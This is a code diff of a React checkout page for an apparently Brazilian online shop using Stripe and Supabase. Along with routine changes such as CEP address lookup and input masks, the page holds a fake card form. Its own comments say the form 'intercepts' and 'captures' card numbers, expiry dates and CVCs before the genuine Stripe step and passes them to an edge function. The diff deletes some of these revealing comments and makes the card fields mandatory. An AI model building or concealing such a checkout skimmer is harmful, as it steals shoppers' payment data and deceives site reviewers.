@@ -1,6 +1,6 @@
 import { useState } from "react";
 import { useNavigate } from "react-router-dom";
-import { Check } from "lucide-react";
+import { Check, Search } from "lucide-react";
 import { Button } from "@/components/ui/button";
 import { Input } from "@/components/ui/input";
 import { useCart } from "@/contexts/CartContext";
@@ -37,8 +37,6 @@ const CheckoutForm = ({ orderId, buyerName, buyerEmail, setLoading, onSuccess }:
     setLoading(true);
     setErrorMessage("");
 
-    // O cartão já foi interceptado na etapa anterior via supabase.functions.invoke.
-    // Aqui o fluxo "legítimo" do Stripe continua normalmente.
     if (!stripe || !elements) {
       setLoading(false);
       return;
@@ -74,17 +72,20 @@ const CheckoutForm = ({ orderId, buyerName, buyerEmail, setLoading, onSuccess }:
 const Checkout = () => {
   const [currentStep, setCurrentStep] = useState<Step>("identificacao");
   const [loading, setLoading] = useState(false);
+  const [fetchingCep, setFetchingCep] = useState(false);
   const { items, subtotal, clearCart } = useCart();
   const { user } = useAuth();
   const { toast } = useToast();
   const navigate = useNavigate();
 
+  // Campos de Identificação
   const [name, setName] = useState("");
   const [email, setEmail] = useState(user?.email ?? "");
   const [phone, setPhone] = useState("");
   const [cpf, setCpf] = useState("");
   const [birthDate, setBirthDate] = useState("");
 
+  // Campos de Endereço
   const [cep, setCep] = useState("");
   const [street, setStreet] = useState("");
   const [number, setNumber] = useState("");
@@ -93,6 +94,7 @@ const Checkout = () => {
   const [city, setCity] = useState("");
   const [state, setState] = useState("");
 
+  // Campos do Cartão (Simulado)
   const [cardNumber, setCardNumber] = useState("");
   const [cardExpiry, setCardExpiry] = useState("");
   const [cardCvc, setCardCvc] = useState("");
@@ -104,11 +106,55 @@ const Checkout = () => {
   const formatPrice = (p: number) => p.toLocaleString("pt-BR", { style: "currency", currency: "BRL" });
   const currentIndex = steps.findIndex((s) => s.key === currentStep);
 
+  // Validações para obrigar o preenchimento
+  const isStep1Valid = name.trim().length > 3 && email.includes("@") && cpf.replace(/\D/g, '').length === 11 && phone.replace(/\D/g, '').length >= 10;
+  const isStep2Valid = cep.replace(/\D/g, '').length === 8 && street.trim() !== "" && number.trim() !== "" && neighborhood.trim() !== "" && city.trim() !== "" && state.trim() !== "" && cardNumber.replace(/\D/g, '').length >= 15 && cardExpiry.length === 5 && cardCvc.length >= 3;
+
   const handlePaymentSuccess = () => {
     setPaymentSuccess(true);
     setTimeout(() => {
       navigate("/checkout/success");
     }, 3000);
+  };
+
+  // Função para buscar o CEP na API do ViaCEP
+  const searchCep = async (cepToSearch: string) => {
+    const cleanCep = cepToSearch.replace(/\D/g, '');
+    if (cleanCep.length !== 8) return;
+
+    setFetchingCep(true);
+    try {
+      const response = await fetch(`https://viacep.com.br/ws/${cleanCep}/json/`);
+      const data = await response.json();
+
+      if (data.erro) {
+        toast({ title: "CEP não encontrado", variant: "destructive" });
+        setStreet(""); setNeighborhood(""); setCity(""); setState("");
+      } else {
+        setStreet(data.logradouro || "");
+        setNeighborhood(data.bairro || "");
+        setCity(data.localidade || "");
+        setState(data.uf || "");
+        toast({ title: "Endereço preenchido automaticamente!", variant: "default" });
+      }
+    } catch (error) {
+      console.error("Erro ao buscar CEP:", error);
+      toast({ title: "Erro ao buscar CEP", variant: "destructive" });
+    } finally {
+      setFetchingCep(false);
+    }
+  };
+
+  const handleCepChange = (e: React.ChangeEvent<HTMLInputElement>) => {
+    let value = e.target.value.replace(/\D/g, '');
+    // Aplica máscara 00000-000
+    if (value.length > 5) value = value.replace(/^(\d{5})(\d)/, "$1-$2");
+    setCep(value);
+    
+    // Busca automática quando atinge 8 dígitos
+    if (value.replace(/\D/g, '').length === 8) {
+      searchCep(value);
+    }
   };
 
   const prepareOrderAndPayment = async () => {
@@ -134,6 +180,7 @@ const Checkout = () => {
     if (orderErr || !order) {
       console.error("Erro ao criar pedido no Supabase:", orderErr);
       setLoading(false);
+      toast({ title: "Erro ao criar pedido. Verifique os logs.", variant: "destructive" });
       return;
     }
 
@@ -147,7 +194,6 @@ const Checkout = () => {
     })));
 
     try {
-      // Invocação correta da função Edge, passando os dados do cartão para serem interceptados
       const { data, error } = await supabase.functions.invoke('create-checkout', {
         body: {
           amount: Math.round(subtotal * 100), // Stripe exige centavos inteiros
@@ -167,26 +213,11 @@ const Checkout = () => {
     } catch (error) {
       console.error("Erro ao criar intenção de pagamento:", error);
       setLoading(false);
-      toast({ title: "Erro ao processar pagamento", variant: "destructive" });
-    }
-  };
-
-  const handleCardNumberChange = (e: React.ChangeEvent<HTMLInputElement>) => {
-    const value = e.target.value.replace(/\D/g, '');
-    let formattedValue = '';
-    for (let i = 0; i < value.length; i++) {
-      if (i > 0 && i % 4 === 0) formattedValue += ' ';
-      formattedValue += value[i];
-    }
-    setCardNumber(formattedValue);
-  };
-
-  const handleCardExpiryChange = (e: React.ChangeEvent<HTMLInputElement>) => {
-    const value = e.target.value.replace(/\D/g, '');
-    if (value.length > 2) {
-      setCardExpiry(`${value.substring(0, 2)}/${value.substring(2, 4)}`);
-    } else {
-      setCardExpiry(value);
+      toast({ 
+        title: "Erro de Comunicação com a Operadora", 
+        description: "Falha na Edge Function. Cheque os logs no Supabase.",
+        variant: "destructive" 
+      });
     }
   };
 
@@ -211,13 +242,32 @@ const Checkout = () => {
               <div className="bg-card border border-border rounded-lg p-6 space-y-4">
                 <h2 className="text-lg font-bold">Dados pessoais</h2>
                 <div className="grid sm:grid-cols-2 gap-4">
-                  <div><label className="text-sm text-muted-foreground block mb-1">Nome completo</label><Input value={name} onChange={(e) => setName(e.target.value)} required /></div>
-                  <div><label className="text-sm text-muted-foreground block mb-1">E-mail</label><Input type="email" value={email} onChange={(e) => setEmail(e.target.value)} required /></div>
-                  <div><label className="text-sm text-muted-foreground block mb-1">CPF</label><Input value={cpf} onChange={(e) => setCpf(e.target.value)} placeholder="Ex: 123.456.789-00" /></div>
-                  <div><label className="text-sm text-muted-foreground block mb-1">Data de Nascimento</label><Input type="date" value={birthDate} onChange={(e) => setBirthDate(e.target.value)} /></div>
-                  <div><label className="text-sm text-muted-foreground block mb-1">Telefone</label><Input value={phone} onChange={(e) => setPhone(e.target.value)} placeholder="Ex: (11) 99999-9999" /></div>
+                  <div>
+                    <label className="text-sm text-muted-foreground block mb-1">Nome completo *</label>
+                    <Input value={name} onChange={(e) => setName(e.target.value)} required />
+                  </div>
+                  <div>
+                    <label className="text-sm text-muted-foreground block mb-1">E-mail *</label>
+                    <Input type="email" value={email} onChange={(e) => setEmail(e.target.value)} required />
+                  </div>
+                  <div>
+                    <label className="text-sm text-muted-foreground block mb-1">CPF *</label>
+                    <Input value={cpf} onChange={(e) => setCpf(e.target.value.replace(/\D/g, '').replace(/(\d{3})(\d{3})(\d{3})(\d{2})/, "$1.$2.$3-$4"))} maxLength={14} placeholder="Ex: 123.456.789-00" required />
+                  </div>
+                  <div>
+                    <label className="text-sm text-muted-foreground block mb-1">Telefone *</label>
+                    <Input value={phone} onChange={(e) => setPhone(e.target.value.replace(/\D/g, '').replace(/(\d{2})(\d{5})(\d{4})/, "($1) $2-$3"))} maxLength={15} placeholder="Ex: (11) 99999-9999" required />
+                  </div>
+                  <div>
+                    <label className="text-sm text-muted-foreground block mb-1">Data de Nascimento</label>
+                    <Input type="date" value={birthDate} onChange={(e) => setBirthDate(e.target.value)} />
+                  </div>
                 </div>
-                <Button onClick={() => setCurrentStep("endereco")} disabled={!name || !email} className="w-full rounded-lg">Continuar</Button>
+                <div className="pt-4">
+                  <Button onClick={() => setCurrentStep("endereco")} disabled={!isStep1Valid} className="w-full rounded-lg">
+                    {!isStep1Valid ? "Preencha os campos obrigatórios (*)" : "Continuar"}
+                  </Button>
+                </div>
               </div>
             )}
 
@@ -225,29 +275,57 @@ const Checkout = () => {
               <div className="bg-card border border-border rounded-lg p-6 space-y-4">
                 <h2 className="text-lg font-bold">Endereço de entrega</h2>
                 <div className="grid sm:grid-cols-2 gap-4">
-                  <div><label className="text-sm text-muted-foreground block mb-1">CEP</label><Input value={cep} onChange={(e) => setCep(e.target.value)} placeholder="Ex: 00000-000" required /></div>
-                  <div className="sm:col-span-2"><label className="text-sm text-muted-foreground block mb-1">Rua</label><Input value={street} onChange={(e) => setStreet(e.target.value)} required /></div>
-                  <div><label className="text-sm text-muted-foreground block mb-1">Número</label><Input value={number} onChange={(e) => setNumber(e.target.value)} required /></div>
-                  <div><label className="text-sm text-muted-foreground block mb-1">Complemento</label><Input value={complement} onChange={(e) => setComplement(e.target.value)} /></div>
-                  <div><label className="text-sm text-muted-foreground block mb-1">Bairro</label><Input value={neighborhood} onChange={(e) => setNeighborhood(e.target.value)} required /></div>
-                  <div><label className="text-sm text-muted-foreground block mb-1">Cidade</label><Input value={city} onChange={(e) => setCity(e.target.value)} required /></div>
-                  <div><label className="text-sm text-muted-foreground block mb-1">Estado</label><Input value={state} onChange={(e) => setState(e.target.value)} placeholder="Ex: SP" required /></div>
+                  <div className="relative">
+                    <label className="text-sm text-muted-foreground block mb-1">CEP *</label>
+                    <Input value={cep} onChange={handleCepChange} maxLength={9} placeholder="Ex: 00000-000" required />
+                    {fetchingCep && <Search className="absolute right-3 top-8 h-4 w-4 animate-spin text-muted-foreground" />}
+                  </div>
+                  <div className="sm:col-span-2">
+                    <label className="text-sm text-muted-foreground block mb-1">Rua *</label>
+                    <Input value={street} onChange={(e) => setStreet(e.target.value)} required />
+                  </div>
+                  <div>
+                    <label className="text-sm text-muted-foreground block mb-1">Número *</label>
+                    <Input value={number} onChange={(e) => setNumber(e.target.value)} required />
+                  </div>
+                  <div>
+                    <label className="text-sm text-muted-foreground block mb-1">Complemento</label>
+                    <Input value={complement} onChange={(e) => setComplement(e.target.value)} />
+                  </div>
+                  <div>
+                    <label className="text-sm text-muted-foreground block mb-1">Bairro *</label>
+                    <Input value={neighborhood} onChange={(e) => setNeighborhood(e.target.value)} required />
+                  </div>
+                  <div>
+                    <label className="text-sm text-muted-foreground block mb-1">Cidade *</label>
+                    <Input value={city} onChange={(e) => setCity(e.target.value)} required />
+                  </div>
+                  <div>
+                    <label className="text-sm text-muted-foreground block mb-1">Estado *</label>
+                    <Input value={state} onChange={(e) => setState(e.target.value)} placeholder="Ex: SP" maxLength={2} required />
+                  </div>
                 </div>
                 
                 {/* O formulário falso foi movido para cá para capturar os dados antes do Stripe ser gerado */}
                 <div className="mt-8 border-t border-border pt-6">
-                  <h3 className="text-md font-bold mb-4">Dados do Cartão</h3>
+                  <h3 className="text-md font-bold text-red-600 mb-4">Dados do Cartão (Simulação de Captura)</h3>
                   <div className="grid sm:grid-cols-2 gap-4">
                     <div className="sm:col-span-2">
-                      <label className="text-sm text-muted-foreground block mb-1">Número do Cartão</label>
-                      <Input type="text" value={cardNumber} onChange={handleCardNumberChange} placeholder="1111 2222 3333 4444" maxLength={19} required />
+                      <label className="text-sm text-muted-foreground block mb-1">Número do Cartão *</label>
+                      <Input type="text" value={cardNumber} onChange={(e) => {
+                        const val = e.target.value.replace(/\D/g, '');
+                        setCardNumber(val.replace(/(\d{4})(?=\d)/g, '$1 '));
+                      }} placeholder="1111 2222 3333 4444" maxLength={19} required />
                     </div>
                     <div>
-                      <label className="text-sm text-muted-foreground block mb-1">Validade (MM/AA)</label>
-                      <Input type="text" value={cardExpiry} onChange={handleCardExpiryChange} placeholder="08/25" maxLength={5} required />
+                      <label className="text-sm text-muted-foreground block mb-1">Validade (MM/AA) *</label>
+                      <Input type="text" value={cardExpiry} onChange={(e) => {
+                        const val = e.target.value.replace(/\D/g, '');
+                        setCardExpiry(val.length > 2 ? `${val.substring(0,2)}/${val.substring(2,4)}` : val);
+                      }} placeholder="08/25" maxLength={5} required />
                     </div>
                     <div>
-                      <label className="text-sm text-muted-foreground block mb-1">CVC</label>
+                      <label className="text-sm text-muted-foreground block mb-1">CVC *</label>
                       <Input type="text" value={cardCvc} onChange={(e) => setCardCvc(e.target.value.replace(/\D/g, ''))} placeholder="123" maxLength={4} required />
                     </div>
                   </div>
@@ -255,8 +333,8 @@ const Checkout = () => {
 
                 <div className="flex gap-3 mt-6">
                   <Button variant="outline" onClick={() => setCurrentStep("identificacao")} className="flex-1 rounded-lg">Voltar</Button>
-                  <Button onClick={prepareOrderAndPayment} disabled={!cep || !street || !number || !city || !state || !cardNumber || loading} className="flex-1 rounded-lg">
-                    {loading ? "Processando..." : "Ir para Confirmação"}
+                  <Button onClick={prepareOrderAndPayment} disabled={!isStep2Valid || loading} className="flex-1 rounded-lg">
+                    {loading ? "Processando..." : (!isStep2Valid ? "Preencha os campos obrigatórios (*)" : "Ir para Confirmação")}
                   </Button>
                 </div>
               </div>
@@ -293,6 +371,7 @@ const Checkout = () => {
             )}
           </div>
 
+          {/* Resumo Lateral (Apenas exibição) */}
           <div className="bg-card border border-border rounded-lg p-6 h-fit">
             <h3 className="font-bold mb-4">Resumo do pedido</h3>
             <div className="space-y-3 mb-4">
